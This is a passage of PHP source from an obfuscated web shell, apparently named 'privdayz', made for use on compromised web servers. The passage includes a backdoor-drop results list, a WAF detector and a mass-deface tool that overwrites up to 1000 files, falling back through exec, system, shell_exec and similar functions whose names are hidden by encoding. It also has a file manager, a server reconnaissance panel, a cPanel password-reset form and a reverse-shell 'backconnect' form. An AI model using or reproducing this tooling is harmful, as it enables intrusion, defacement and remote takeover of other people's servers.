       if ($ok)
          $sonuclar[] = "<b style='color:#10b981'>[OK]</b> <a href='$url' target='_blank' style='color:#e53935;'>$url</a>";
       else
          $sonuclar[] = "<b style='color:#e53935'>[FAIL]</b> $file";
     }

     echo "<div class='pzcard-info' style='margin-top:17px;font-size:1.09em;'>";
     echo "<b>Drop edilen backdoor linkleri:</b><br>";
     echo implode("<br>", $sonuclar);
     echo "</div>";
    }
    ?>

  </div>
</div>
<?php elseif (isset($_GET['wafdet'])): ?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon" style="background:#ff6f00;"><i class="fas fa-shield-halved"></i></div>
    <div class="pzcard-title">
    <b>WAF / Firewall / Reverse Proxy Detector</b>
    </div>
  </div>
  <div class="pzcard-content">
    <form id="pzcard-waf-form" method="post" class="pzcard-form" autocomplete="off" style="margin-bottom:24px;">
    <div class="pzcard-form-row">
     <label class="pzcard-label">Target URL or Domain:</label>
     <input type="text" name="waf_target" class="pzcard-input" placeholder="https://example.com" required style="min-width:320px;" value="<?= htmlspecialchars((isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '')) ?>">
     <button type="submit" class="pzcard-btn pzcard-btn-orange" style="margin-left:12px;"><i class="fas fa-bolt"></i> Scan</button>
    </div>
    </form>
    <?php
    function stealth_strtolower($str) {return mb_strtolower($str, 'UTF-8');}
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['waf_target'])):
    $rtfccq = trim($_POST['waf_target']);
    if (!preg_match('#^https?://#i', $rtfccq)) $rtfccq = "http://".$rtfccq;
    $fw_map = [
     'Cloudflare'   => ['server: cloudflare', 'cf-ray', 'cf-cache-status', '__cfduid', 'cloudflare-nginx'],
     'Sucuri'    => ['x-sucuri-id', 'x-sucuri-cache', 'x-sucuri'],
     'ModSecurity'  => ['mod_security', 'modsec', 'x-mod-sec'],
     'Imunify360'   => ['imunify360', 'x-imunify360'],
     'w4f'    => ['w4f', 'x-w4f'],
     'OpenResty'    => ['openresty'],
     'AWS WAF'    => ['awsalb', 'awselb', 'x-amzn'],
     'Incapsula'    => ['incapsula', 'x-cdn', 'x-iinfo'],
     'StackPath'    => ['stackpath'],
     'Quttera'    => ['quttera'],
     'PerimeterX'   => ['perimeterx'],
     'Reblaze'    => ['reblaze'],
     'DDoS-Guard'   => ['ddos-guard'],
     'Fastly'    => ['fastly'],
     'NAXSI'     => ['naxsi'],
     'SafeDog'    => ['safedog', 'waf.sid'],
     '360 Web Application Firewall' => ['360wzb', 'wzws-rid'],
     'Baidu Yunjiasu' => ['yunjiasu'],
     'Yunjiasu'    => ['yunjiasu'],
     'F5 BIG-IP'    => ['bigip', 'f5-'],
     'Barracuda'    => ['barracuda'],
     'Profense'    => ['profense'],
     'Akamai'    => ['akamai', 'akamai-ghost'],
     'FortiWeb'    => ['fortiweb'],
     'URLScan'    => ['urlscan'],
    ];
    $result = [];
    $err = false;
    $headers = @get_headers($rtfccq, 1);
    $all_hdr = '';
    if ($headers && is_array($headers)) foreach ($headers as $k=>$v) {
     $all_hdr .= stealth_strtolower($k.': '.(is_array($v)?implode('; ',$v):$v))."\n";
    }
    $body = @file_get_contents($rtfccq);
    $all_body = stealth_strtolower($body);
    foreach ($fw_map as $fw=>$patterns) {
     foreach ($patterns as $sig) {
       if (strpos($all_hdr, $sig)!==false || strpos($all_body, $sig)!==false) {
       $result[$fw]=true; break;
       }
     }
    }
    ?>
    <div class="pzcard-info" style="margin-bottom:13px;">
    <i class="fas fa-bug"></i>
    <span>Scan results for: <b><?= htmlspecialchars($rtfccq) ?></b></span>
    </div>
    <div class="pzcard-table-wrap">
    <table class="pzcard-table">
     <thead>
       <tr>
       <th>Firewall / Proxy</th>
       <th>Status</th>
       </tr>
     </thead>
     <tbody>
     <?php
     if ($result) {
       foreach ($result as $fw=>$v) {
       echo '<tr>
        <td><b style="color:#e53935"><i class="fas fa-shield-halved"></i> '.htmlspecialchars($fw).'</b></td>
        <td><span style="color:#10b981;">Detected</span></td>
       </tr>';
       }
     } else {
       echo '<tr>
       <td colspan="2" style="color:#0fa;"><i class="fas fa-check"></i> No major WAF / reverse proxy detected.</td>
       </tr>';
     }
     ?>
     </tbody>
    </table>
    </div>
    <?php endif; ?>
  </div>
</div>
<?php elseif (isset($_GET['massdeface'])): ?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon" style="background:#e53935;"><i class="fas fa-explosion"></i></div>
    <div class="pzcard-title">
    <b>mass def4ce t00l</b>
    </div>
  </div>
  <div class="pzcard-content">
    <form method="post" class="pzcard-form" autocomplete="off" style="margin-bottom:24px;">
    <div class="pzcard-form-row">
     <label class="pzcard-label">target filename:</label>
     <input type="text" name="d3f_f1l" class="pzcard-input" placeholder="index.php or 404.html" value="index.php" required style="max-width:180px;">
    </div>
    <div class="pzcard-form-row">
     <label class="pzcard-label">p4yl0ad / content:</label>
     <textarea name="d3f_cont" class="pzcard-textarea" rows="7" placeholder="Paste shell/code/deface html here..." required></textarea>
    </div>
    <div class="pzcard-form-row" style="margin-bottom:10px;">
     <label class="pzcard-label">directory to scan:</label>
     <input type="text" name="d3f_r0" class="pzcard-input" placeholder="/home/user/public_html/" value="<?= htmlspecialchars(getcwd()) ?>" required>
    </div>
    <div class="pzcard-form-row">
     <button type="submit" name="s7bm1t_d3f" class="pzcard-btn pzcard-btn-red">
       <i class="fas fa-skull-crossbones"></i> Start Mass Replace
     </button>
    </div>
    </form>
    <div class="pzcard-info" style="margin-bottom:18px;">
    <i class="fas fa-info-circle"></i>
    <span>
     <b style="color:#e53935;">WARNING:</b> All matching files will be overwritten! (Max: 1000 files/run)
    </span>
    </div>
    <div class="pzcard-table-wrap">
    <table class="pzcard-table">
     <thead>
       <tr>
       <th>#</th>
       <th>File Path</th>
       <th>Method</th>
       <th>Status</th>
       </tr>
     </thead>
     <tbody>
     <?php
 function pr7xcz($n) { $map = array("\x66\157\x70\x65\156" => "\x31\60\62\54\x31\61\61\54\61\61\62\x2c\61\60\61\54\x31\61\60", "\x66\x69\x6c\x65\x5f\x70\165\164\x5f\x63\157\x6e\164\x65\x6e\164\163" => "\x31\x30\62\x2c\61\60\65\x2c\61\60\70\x2c\61\60\61\x2c\x39\65\54\61\x31\x32\x2c\x31\61\x37\54\x31\61\x36\54\x39\x35\x2c\x39\x39\x2c\x31\x31\x31\54\x31\61\x30\54\x31\61\66\x2c\x31\60\x31\54\x31\x31\60\54\61\x31\66\x2c\x31\61\x35", "\x73\150\x65\x6c\x6c\137\145\170\145\x63" => "\x31\61\x35\x2c\x31\x30\x34\x2c\61\60\61\54\61\60\70\54\61\x30\x38\54\x39\65\54\x31\60\x31\x2c\61\62\60\54\61\x30\x31\54\x39\x39", "\145\170\x65\143" => "\x31\x30\x31\54\61\62\x30\x2c\61\60\x31\54\x39\x39", "\163\171\x73\164\x65\x6d" => "\61\x31\65\54\x31\62\x31\54\x31\61\x35\x2c\x31\61\x36\x2c\x31\x30\61\x2c\x31\60\71", "\x70\141\163\x73\x74\x68\x72\165" => "\61\61\x32\x2c\71\x37\54\x31\x31\x35\54\61\61\65\x2c\61\61\66\54\x31\60\x34\x2c\61\61\64\x2c\61\61\67", "\160\x72\x6f\x63\x5f\x6f\160\x65\x6e" => "\61\61\62\x2c\61\x31\x34\x2c\61\x31\61\x2c\71\x39\54\x39\65\x2c\61\x31\61\x2c\x31\61\x32\54\61\60\x31\x2c\x31\x31\60", "\160\157\160\x65\x6e" => "\61\x31\62\x2c\61\x31\x31\54\x31\61\x32\54\61\x30\x31\x2c\61\x31\x30", "\x66\167\162\x69\164\145" => "\61\x30\x32\54\x31\61\x39\54\61\x31\64\54\61\60\x35\x2c\61\x31\66\x2c\61\60\x31", "\146\143\x6c\157\163\x65" => "\61\60\62\54\x39\x39\54\x31\60\x38\54\x31\x31\x31\x2c\x31\61\x35\x2c\x31\60\x31"); return isset($map[$n]) ? chDxzZ($map[$n]) : $n; }
     if (isset($_POST['s7bm1t_d3f'])) {
       $rtfccq = trim($_POST['d3f_f1l']);
       $pr1vd4yz_c0m   = trim($_POST['d3f_r0']);
       $pyxox = $_POST['d3f_cont'];
       if (!$rtfccq || !$pr1vd4yz_c0m || !$pyxox) {
       echo '<tr><td colspan="4" style="color:#e53935;">Input missing!</td></tr>';
       } else {
       $count = 0;
       $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($pr1vd4yz_c0m, FilesystemIterator::SKIP_DOTS));
       $max_files = 1000; $count = 0;
foreach ($rii as $file) {
    if ($count % 100 == 0) { flush();  }
    if (++$count > $max_files) break; 
        if (strtolower($file->getFilename()) === strtolower($rtfccq)) {
          $fpath = $file->getPathname();
          $status = '';
          $method = '';
          goto YU6B5; cdiUg: $fwrite = pr7xcz("\x66\167\162\x69\x74\145"); goto x9s7D; YU6B5: $fpXq = pr7xcz("\x66\x6f\x70\145\156"); goto cdiUg; x9s7D: $fclose = pr7xcz("\x66\143\154\x6f\x73\x65");
          $fh = @$fpXq($fpath, 'wb');
          if ($fh) { $fwrite($fh, $pyxox); $fclose($fh); $status = 'OK'; $method = 'fopen'; }
          goto WDSJf; pXxbn: if (!$status && function_exists(pr7xcz("\x70\x61\163\x73\164\150\x72\165"))) { $pr1cvxS = pr7xcz("\x70\141\163\x73\164\x68\x72\165"); $pr1pr1v = "\x65\x63\150\157\x20\47" . str_replace("\47", "\47\x5c\47\x27", $pyxox) . "\47\40\76\40" . escapeshellarg($fpath);  @$pr1cvxS($pr1pr1v);  if (@filesize($fpath) >= strlen($pyxox) * 0.7) { $status = "\x4f\113"; $method = "\x70\x61\163\x73\x74\150\162\165"; } } goto ASUGV; lo7km: if (!$status && function_exists(pr7xcz("\160\157\160\x65\156"))) { $popen = pr7xcz("\x70\157\160\x65\x6e"); $ph = @$popen("\x63\141\x74\x20\x3e\x20" . escapeshellarg($fpath), "\167"); if ($ph) { fwrite($ph, $pyxox); fclose($ph); } if (@filesize($fpath) >= strlen($pyxox) * 0.7) { $status = "\x4f\113"; $method = "\x70\x6f\160\145\156"; } } goto RYZfv; cy3xC: if (!$status && function_exists(pr7xcz("\x73\x68\x65\x6c\154\137\x65\x78\x65\x63"))) { $shell_exec = pr7xcz("\163\150\x65\x6c\154\x5f\x65\170\x65\143"); $pr1pr1v = "\145\143\150\157\40\x27" . str_replace("\x27", "\47\x5c\x27\x27", $pyxox) . "\47\x20\x3e\x20" . escapeshellarg($fpath); @$chDx2x($pr1pr1v); if (@filesize($fpath) >= strlen($pyxox) * 0.7) { $status = "\x4f\x4b"; $method = "\163\150\145\154\154\137\x65\x78\145\143"; } } goto D1yZ2; D1yZ2: if (!$status && function_exists(pr7xcz("\x65\170\x65\143"))) { $exec = pr7xcz("\145\x78\145\x63"); $pr1pr1v = "\145\143\x68\157\40\47" . str_replace("\x27", "\x27\x5c\47\x27", $pyxox) . "\x27\40\x3e\40" . escapeshellarg($fpath); @$exec($pr1pr1v, $out, $rc); if (@filesize($fpath) >= strlen($pyxox) * 0.7) { $status = "\x4f\113"; $method = "\x65\170\145\x63"; } } goto SS_Lw; SS_Lw: if (!$status && function_exists(pr7xcz("\163\171\163\x74\145\x6d"))) { $system = pr7xcz("\163\171\x73\164\145\x6d"); $pr1pr1v = "\145\143\x68\x6f\40\x27" . str_replace("\x27", "\47\x5c\x27\47", $pyxox) . "\47\40\x3e\x20" . escapeshellarg($fpath);  @$system($pr1pr1v);  if (@filesize($fpath) >= strlen($pyxox) * 0.7) { $status = "\117\113"; $method = "\x73\171\163\x74\x65\x6d"; } } goto pXxbn; ASUGV: if (!$status && function_exists(pr7xcz("\x70\162\157\x63\137\x6f\160\145\156"))) { $proc_open = pr7xcz("\160\x72\x6f\143\137\157\160\x65\156"); $descs = array(array("\160\151\x70\145", "\x77"), array("\160\x69\160\x65", "\167"), array("\x70\x69\x70\145", "\167")); $process = @$proc_open("\x63\x61\x74\40\76\40" . escapeshellarg($fpath), $descs, $pipes); if (is_resource($process)) { fwrite($pipes[0], $pyxox); fclose($pipes[0]); $out = stream_get_contents($pipes[1]); fclose($pipes[1]); $err = stream_get_contents($pipes[2]); fclose($pipes[2]); proc_close($process); if (@filesize($fpath) >= strlen($pyxox) * 0.7) { $status = "\x4f\x4b"; $method = "\160\x72\157\143\x5f\157\160\145\156"; } } } goto lo7km; WDSJf: if (!$status && function_exists(pr7xcz("\146\151\x6c\145\137\160\165\164\137\x63\x6f\x6e\164\145\x6e\x74\163"))) { $file_put_contents = pr7xcz("\146\151\x6c\145\x5f\160\x75\x74\x5f\143\x6f\156\x74\x65\156\164\x73"); $ok = @$file_put_contents($fpath, $pyxox); if ($ok !== false) { $status = "\x4f\x4b"; $method = "\x66\151\154\145\x5f\x70\165\x74\x5f\143\157\x6e\164\x65\156\x74\x73"; } } goto cy3xC; RYZfv:
          if (!$status) { $status = '<span style="color:#e53935">FAIL</span>'; $method = '-'; }

          $count++;
          echo '<tr>
          <td>'.$count.'</td>
          <td style="font-family:monospace;color:#e53935;">'.htmlspecialchars($fpath).'</td>
          <td style="color:#888;">'.$method.'</td>
          <td>'.($status == 'OK' ? '<b style="color:#10b981;">OK</b>' : $status).'</td>
          </tr>';
          if ($count > 1000) break;
        }
       }
       unset($file);
       unset($rii);
       if ($count == 0) {
        echo '<tr><td colspan="4" style="color:#e53935;">No file found.</td></tr>';
       }
       }
     } else {
       echo '<tr><td colspan="4" style="opacity:.5;">No operation yet.</td></tr>';
     }
     ?>
     </tbody>
    </table>
    </div>
  </div>
</div>
<?php elseif (isset($_GET['process'])): ?>
  <div class="pr1vd4yz-card">
    <div class="pr1vd4yz-card-header">
    <h2 class="pr1vd4yz-card-title">
  <i class="fas fa-server pr1vd4yz-icon-red"></i>
  root process watch
</h2>

    </div>
    <div class="pr1vd4yz-card-section">
    <div class="pr1vd4yz-table-wrap">
     <table class="pr1vd4yz-table-proc">
       <thead>
       <tr>
        <th>PID</th>
        <th>User</th>
        <th>CPU %</th>
        <th>MEM %</th>
        <th>Command</th>
        <th>Action</th>
       </tr>
       </thead>
       <tbody>
       <?php 
       $processes = [];
if (isset($_GET['process'])) { $processes = getProcessList(); }
       foreach ($processes as $process): 
       ?>
        <tr>
          <td class="pr1vd4yz-proc-pid"><?= $process['pid'] ?></td>
          <td class="pr1vd4yz-proc-user"><?= $process['user'] ?></td>
          <td class="pr1vd4yz-proc-cpu"><?= $process['cpu'] ?></td>
          <td class="pr1vd4yz-proc-mem"><?= $process['mem'] ?></td>
          <td class="pr1vd4yz-proc-cmd" title="<?= htmlspecialchars($process['command']) ?>">
          <?= htmlspecialchars(substr($process['command'], 0, 50)) ?>
          </td>
          <td>
          <form method="POST" style="display:inline;"><input type="hidden" name="pid" value="<?= $process['pid'] ?>">
            <button type="submit" class="pr1vd4yz-btn pr1vd4yz-btn-red pr1vd4yz-kill-btn">
             <i class="fas fa-skull"></i> Kill
            </button>
          </form>
          </td>
        </tr>
       <?php endforeach; ?>
       </tbody>
     </table>
    </div>
    </div>
  </div>
<?php elseif (isset($_GET['network'])): ?>
  <div class="pr1vd4yz-card">
    <div class="pr1vd4yz-card-header">
<h2 class="pr1vd4yz-card-title">
  <i class="fas fa-bolt pr1vd4yz-icon-red"></i>
  live net threats
</h2>
    </div>
    <div class="pr1vd4yz-card-section">
    <div class="pr1vd4yz-table-wrap">
     <table class="pr1vd4yz-table-net">
       <thead><tr>
        <th>protocol</th>
        <th>local address</th>
        <th>remote address</th>
        <th>status</th>
        <th>pid</th>
       </tr>
       </thead>
       <tbody>
       <?php 
       $connections = [];
       if (isset($_GET['network'])) { $connections = getNetworkConnections(); }
       foreach ($connections as $conn): 
       ?>
       <tr>
        <td><?= $conn['proto'] ?></td>
        <td class="pr1vd4yz-net-local"><?= $conn['local'] ?></td>
        <td class="pr1vd4yz-net-remote"><?= $conn['remote'] ?></td>
        <td class="pr1vd4yz-net-status"><?= $conn['status'] ?></td>
        <td class="pr1vd4yz-net-pid"><?= $conn['pid'] ?></td>
       </tr>
       <?php endforeach; ?>
       </tbody>
     </table>
    </div>
    </div>
  </div>
<?php else: ?>

<div class="pr1vd4yz-lite-uname">
  <span class="pr1vd4yz-lite-dot"></span>
  <?= php_uname(); ?>
</div>

<div class="pr1vd4yz-lite-info">
    <div class="pr1vd4yz-lite-row">
    <span class="pr1vd4yz-lite-key">[safe mode]</span>
    <span class="pr1vd4yz-lite-val <?= ini_get('safe_mode') ? 'pr1vd4yz-lite-on' : 'pr1vd4yz-lite-off' ?>">
    <?= ini_get('safe_mode') ? 'ON' : 'OFF'; ?>
    </span>
  </div>
<div class="pr1vd4yz-lite-row"><span class="pr1vd4yz-lite-key">[d1s4bl3 f7nct1ons]</span>
  <?php
    $d1sxb = trim(ini_get('disable_functions'), ", \t\n\r\0\x0B");
    if (!$d1sxb) {
    echo '<span class="pr1vd4yz-lite-val pr1vd4yz-lite-on" style="background:#eafff5;">None</span>';
    } else {
    echo '<span class="pr1vd4yz-lite-val pr1vd4yz-lite-off" style="white-space:normal;">'
       . str_replace(",", ", ", $d1sxb)
       . '</span>';
    }
  ?>
</div>

  <div class="pr1vd4yz-lite-row"><span class="pr1vd4yz-lite-key">[h0st]</span> <span class="pr1vd4yz-lite-val"><?= $pr1vxas[8](); ?></span></div>
  <div class="pr1vd4yz-lite-row"><span class="pr1vd4yz-lite-key">[us3r]</span> <span class="pr1vd4yz-lite-val"><?=$pr1vxas[9](); ?></span></div>
  <div class="pr1vd4yz-lite-row"><span class="pr1vd4yz-lite-key">[s0ftware]</span> <span class="pr1vd4yz-lite-val"><?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?></span></div>
  <div class="pr1vd4yz-lite-row"><span class="pr1vd4yz-lite-key">[1p]</span> <span class="pr1vd4yz-lite-val"><?= gethostbyname($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]); ?></span></div>
  <div class="pr1vd4yz-lite-row"><span class="pr1vd4yz-lite-key">[php]</span> <span class="pr1vd4yz-lite-val"><?= PHP_VERSION; ?></span></div>
<div class="pr1vd4yz-lite-row" style="gap:7px;flex-wrap:wrap;">
<?php
if (!function_exists('fobf')) {
    function fobf($arr) {
     $r = '';
     foreach ($arr as $n) $r .= chr($n);
     return $r;
    }
}
$fnX6 = fobf([102,117,110,99,116,105,111,110,95,101,120,105,115,116,115]);
$chDxXZx      = fobf([105,110,105,95,103,101,116]); 
$fn_php_sapi_name   = fobf([112,104,112,95,115,97,112,105,95,110,97,109,101]);

$features = [
  'CURL'      => function() use($fnX6) {
    $f = fobf([99,117,114,108,95,105,110,105,116]);
    return $fnX6($f);
  },
  'SSH2'      => function() use($fnX6) {
    $f = fobf([115,115,104,50,95,99,111,110,110,101,99,116]);
    return $fnX6($f);
  },
  'Magic Quotes' => function() use($chDxXZx) {
    $f = fobf([109,97,103,105,99,95,113,117,111,116,101,115,95,103,112,99]);
    return (bool)$chDxXZx($f);
  },
  'MySQL'     => function() use($fnX6) {
    $f1 = fobf([109,121,115,113,108,105,95,99,111,110,110,101,99,116]);
    $f2 = fobf([109,121,115,113,108,95,99,111,110,110,101,99,116]);
    return $fnX6($f1) || $fnX6($f2);
  },
  'MSSQL'     => function() use($fnX6) {
    $f1 = fobf([109,115,115,113,108,95,99,111,110,110,101,99,116]);
    $f2 = fobf([115,113,108,115,114,118,95,99,111,110,110,101,99,116]);
    return $fnX6($f1) || $fnX6($f2);
  },
  'PostgreSQL'   => function() use($fnX6) {
    $f = fobf([112,103,95,99,111,110,110,101,99,116]);
    return $fnX6($f);
  },
  'Oracle'    => function() use($fnX6) {
    $f = fobf([111,99,105,95,99,111,110,110,101,99,116]);
    return $fnX6($f);
  },
  'CGI'       => function() use($fn_php_sapi_name) {
    $name = $fn_php_sapi_name();
    return ($name === 'cgi' || $name === 'cgi-fcgi');
  },
];


foreach ($features as $name => $fn) {
  $on = $fn() ? 'ON' : 'OFF';
  $class = $on === 'ON' ? 'pr1vd4yz-lite-on' : 'pr1vd4yz-lite-off';
  echo '<span class="pr1vd4yz-lite-badge '.$class.'">'.$name.' : '.$on.'</span> ';
}
?>

  </div>
</div>
<div class="pr1vd4yz-filelist-root">
<div class="prv-fm-actions">
  <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&createfolder" class="prv-fm-btn" title="New Folder">
    <i class="fas fa-folder-plus"></i> <span>newFolder</span>
  </a>
  <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&createfile" class="prv-fm-btn" title="New File">
    <i class="fas fa-file-circle-plus"></i> <span>newFile</span>
  </a>
  <form class="prv-fm-upload" action="" method="post" enctype="multipart/form-data">
    <input type="file" name="privdayz-upload" id="prv-upload-1" class="prv-fm-upload-input">
    <label for="prv-upload-1" class="prv-fm-btn">
    <i class="fas fa-cloud-arrow-up"></i> <span>upFile</span>
    </label>
    <button type="submit" name="privdayz-up-submit" class="prv-fm-btn prv-fm-btn-green">
    <i class="fas fa-circle-check"></i> <span>up</span>
    </button>
  </form>
  <form class="prv-fm-upload" action="" method="post" enctype="multipart/form-data">
    <input type="file" name="w4f-upload" id="prv-upload-2" class="prv-fm-upload-input">
    <label for="prv-upload-2" class="prv-fm-btn">
    <i class="fas fa-cloud-arrow-up"></i> <span>upFile2</span>
    </label>
    <button type="submit" name="w4f-up-submit" class="prv-fm-btn prv-fm-btn-green">
    <i class="fas fa-circle-check"></i> <span>up</span>
    </button>
  </form>
</div>
  <form action="" method="post">
    <div class="pr1vd4yz-filelist-head">
     
    </div>
    <div class="pr1vd4yz-filelist-body">
     
    <?php foreach ($pr1vf1l3 as $_D): ?>
     <?php if ($pr1vxas[2]($_D)): ?>
       <div class="pr1vd4yz-file-row pr1vd4yz-dir">
       <span class="pr1vd4yz-file-col pr1vd4yz-file-check">
        <input type="checkbox" name="check[]" value="<?= $_D ?>">
       </span>
       <span class="pr1vd4yz-file-col pr1vd4yz-file-icon"><i class="fa-solid fa-folder-open"></i></span>
       <span class="pr1vd4yz-file-col pr1vd4yz-file-name">
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]() . '/' . $_D); ?>" class="pr1vd4yz-file-link"><?= prvFx1($_D); ?></a>
       </span>
       <span class="pr1vd4yz-file-col pr1vd4yz-file-perm"><?= p3rms($pr1vxas[0]() . '/' . $_D); ?></span>
       <span class="pr1vd4yz-file-col pr1vd4yz-file-size"></span>
       <span class="pr1vd4yz-file-col pr1vd4yz-file-actions">
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()); ?>&re=<?= pr1vd444yz($_D) ?>" title="Rename"><i class="fa-regular fa-pen-to-square"></i></a>
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()); ?>&ch=<?= pr1vd444yz($_D) ?>" title="Chmod"><i class="fa-solid fa-user-gear"></i></a>
       </span>
       </div>
     <?php endif; ?>
    <?php endforeach; ?>
    <?php foreach ($pr1vf1l3 as $_F): ?>
     <?php if ($pr1vxas[3]($_F)): ?>
       <?php $ext = strtolower(pathinfo($_F, PATHINFO_EXTENSION)); ?>
       <div class="pr1vd4yz-file-row pr1vd4yz-file">
       <span class="pr1vd4yz-file-col pr1vd4yz-file-check">
        <input type="checkbox" name="check[]" value="<?= $_F ?>">
       </span>
       <span class="pr1vd4yz-file-col pr1vd4yz-file-icon">
        <?php if ($ext === 'php'): ?>
          <i class="fa-brands fa-php"></i>
        <?php elseif (in_array($ext, ['jpg','jpeg','png','gif','webp','svg'])): ?>
          <i class="fa-regular fa-image"></i>
        <?php elseif (in_array($ext, ['zip','rar','gz','tar','7z'])): ?>
          <i class="fa-solid fa-box-archive"></i>
        <?php elseif (in_array($ext, ['txt','md','log'])): ?>
          <i class="fa-regular fa-note-sticky"></i>
        <?php elseif ($ext === 'js'): ?>
          <i class="fa-brands fa-js"></i>
        <?php elseif ($ext === 'css'): ?>
          <i class="fa-brands fa-css3-alt"></i>
        <?php elseif (in_array($ext, ['html','htm'])): ?>
          <i class="fa-brands fa-html5"></i>
        <?php elseif (in_array($ext, ['json','yaml','yml','xml'])): ?>
          <i class="fa-solid fa-code"></i>
        <?php elseif (in_array($ext, ['mp3','wav','flac'])): ?>
          <i class="fa-solid fa-headphones"></i>
        <?php elseif (in_array($ext, ['mp4','avi','mov','webm','mkv'])): ?>
          <i class="fa-solid fa-film"></i>
        <?php else: ?>
          <i class="fa-regular fa-file"></i>
        <?php endif; ?>
       </span>
       <span class="pr1vd4yz-file-col pr1vd4yz-file-name"><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()); ?>&f=<?= pr1vd444yz($_F); ?>" class="pr1vd4yz-file-link"><?= prvFx1($_F); ?></a>
        <span class="pr1vd4yz-file-ext"><?= strtoupper($ext) ?></span>
       </span>
       <span class="pr1vd4yz-file-perm <?= is_writable($pr1vxas[0]() . '/' . $_F) ? 'pr1vd4yz-file-writable' : 'pr1vd4yz-file-readonly' ?>">
        <i class="fas <?= is_writable($pr1vxas[0]() . '/' . $_F) ? 'fa-unlock-alt pr1vd4yz-perm-green' : 'fa-lock pr1vd4yz-perm-red' ?>"></i>
        <?= p3rms($pr1vxas[0]() . '/' . $_F); ?>
       </span>
       <span class="pr1vd4yz-file-size-badge">
        <?= formatSize(filesize($_F)); ?>
       </span>
       <span class="pr1vd4yz-file-col pr1vd4yz-file-actions">
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()); ?>&re=<?= pr1vd444yz($_F) ?>" title="Rename"><i class="fa-regular fa-pen-to-square"></i></a>
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()); ?>&ch=<?= pr1vd444yz($_F) ?>" title="Chmod"><i class="fa-solid fa-user-gear"></i></a>
        <a href="?action=delete&item=<?= pr1vd444yz($_F) ?>" title="Delete"><i class="fa-solid fa-ban"></i></a>
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()); ?>&don=<?= pr1vd444yz($_F) ?>" title="Download"><i class="fa-solid fa-download"></i></a></span>
       </div>
     <?php endif; ?>
    <?php endforeach; ?>
    </div>
    <div class="pr1vd4yz-filelist-foot">
    <select name="privdayz-select" class="pr1vd4yz-filelist-select">
     <option value="delete">delete</option>
     <option value="unzip">unzip</option>
     <option value="zip">zip</option>
    </select>
    <button type="submit" name="submit-action" class="pr1vd4yz-filelist-btn"><i class="fa-solid fa-rocket"></i> run</button>
    </div>
  </form>
</div>
 <?php endif; ?>
          </div>
       </div>
     </div>

  <?php if (isset($_GET['cpanelreset'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard" style="max-width:410px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#fb923c;color:#fff;"><i class="fab fa-cpanel"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">cPanel reset</div>
       <div class="pr1vd4yz-wiz-desc">reset cPanel password</div>
     </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>

    </div>
    <form action="" method="post">
     <div class="pr1vd4yz-wiz-section">
       <div class="pr1vd4yz-wiz-section-icon" style="background:#fff5e6;color:#fb923c;"><i class="fas fa-envelope"></i></div>
       <div class="pr1vd4yz-wiz-fields"><input type="email" name="resetcp" class="pr1vd4yz-wiz-input" placeholder="privdayz@privdayz.com">
       </div>
     </div>
     <div class="pr1vd4yz-modal-actions-wiz">
       <button type="submit" name="submit" class="pr1vd4yz-wiz-btn" style="background:#fb923c;color:#fff;border:1.1px solid #fb923c;">
       <i class="fas fa-sync-alt"></i> reset
       </button>
          <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
     </div>
    </form>
    </div>
  </div>
<?php endif; ?>
    
  <?php if (isset($_GET['backconnect'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon"><i class="fas fa-network-wired"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">backconnect shell</div>
       <div class="pr1vd4yz-wiz-desc">remote connection start (reverse shell)</div>
     </div>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form action="" method="post">
     <div class="pr1vd4yz-wiz-section">
       <div class="pr1vd4yz-wiz-section-icon"><i class="fas fa-terminal"></i></div>
       <div class="pr1vd4yz-wiz-fields">
       <select name="privdayz-bc" class="pr1vd4yz-wiz-input">
        <option value="-">choose method</option>
        <option value="perl">perl</option>
        <option value="python">python</option>
        <option value="ruby">ruby</option>
        <option value="bash">bash</option>
        <option value="xterm">xterm</option>
        <option value="golang">golang</option>
        <option value="php">php</option>
        <option value="nc">nc</option>
        <option value="sh">sh</option>
       </select>
       <input type="text" name="backconnect-host" class="pr1vd4yz-wiz-input" placeholder="Host (e.g. 55.66.33.22)">
       <input type="number" name="backconnect-port" class="pr1vd4yz-wiz-input" placeholder="Port (e.g. 1337)">
       </div>
     </div>
     <div class="pr1vd4yz-modal-actions-wiz">
       <button type="submit" name="submit-bc" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red">
       <iclass="fas fa-plug"></i> connect
       </button>
       <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light">
       <i class="fas fa-times"></i> go back
       </a>
     </div>
    </form>
    </div>
  </div>
<?php endif; ?>
